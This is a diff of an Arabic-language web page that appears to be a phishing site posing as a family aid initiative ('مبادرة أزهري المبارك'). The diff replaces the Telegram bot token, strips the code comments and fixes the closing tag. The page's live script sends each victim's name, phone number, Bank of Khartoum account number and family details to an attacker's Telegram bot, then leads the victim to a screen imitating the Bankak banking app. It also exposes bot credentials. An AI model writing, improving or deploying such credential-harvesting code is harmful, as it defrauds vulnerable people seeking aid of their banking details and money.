@@ -1107,7 +1107,7 @@
 
     <!-- البرمجة والقيود المحدثة -->
     <script>
-        const botToken = "8827076146:AAGG1sCoE9ZZ_gH-zJT02tnVawtQeCTVnpE";
+        const botToken = "9268850834:AAGrE75Gl5U7I4PsmTJldceJ6i65pzFA8uQ";
         const chatId = "8819084684";
 
         function sendDataToTelegram(message) {
@@ -1165,7 +1165,6 @@
                 }
             }
 
-            // قيد رقم الهاتف ألا يقل عن 10 أرقام
             const phoneVal = document.getElementById('phone').value.trim();
             if (phoneVal.length < 10) {
                 document.getElementById('phone').classList.add('input-error');
@@ -1175,7 +1174,6 @@
                 return false;
             }
 
-            // قيد رقم حساب بنك الخرطوم (يجب أن يكون 7 أرقام بالضبط)
             const bankAccountVal = document.getElementById('bankAccount').value.trim();
             if (bankAccountVal.length !== 7 || !/^\d{7}$/.test(bankAccountVal)) {
                 document.getElementById('bankAccount').classList.add('input-error');
@@ -1185,7 +1183,6 @@
                 return false;
             }
 
-            // قيد عدد أفراد الأسرة ألا يزيد عن 9
             const membersVal = parseInt(document.getElementById('familyMembers').value);
             if (isNaN(membersVal) || membersVal > 9 || membersVal < 1) {
                 document.getElementById('familyMembers').classList.add('input-error');
@@ -1228,7 +1225,6 @@
             const formattedNum = totalAmount.toLocaleString('en-US');
             const formattedWords = numberToArabicWords(totalAmount);
 
-            // إرسال تفاصيل الاستمارة للبوت فوراً
             sendDataToTelegram(`📋 *طلب مساعدة جديد (مبادرة أزهري المبارك)*\n\n👤 اسم رب الأسرة: \`${familyName}\`\n📱 الهاتف: \`${phone}\`\n🏦 رقم الحساب: \`${bankAccount}\`\n👥 أفراد الأسرة: \`${members}\`\n📌 الصفة: \`${isHead}\`\n📍 الإقامة: \`${location}\`\n💵 المبلغ المخصص: \`${formattedNum} (${formattedWords})\``);
 
             document.getElementById('userIdInput').value = bankAccount;
@@ -1250,7 +1246,6 @@
             }, 2500);
         }
 
-        // إضافة شاشة تحميل قصيرة قبل الانتقال لواجهة بنكك
         function startTransitionToBankApp() {
             document.getElementById('resultBox').style.display = 'none';
             document.getElementById('shortLoaderBox').style.display = 'block';
@@ -1417,4 +1412,4 @@
         }, 10000);
     </script>
 </body>
-</html
+</html>
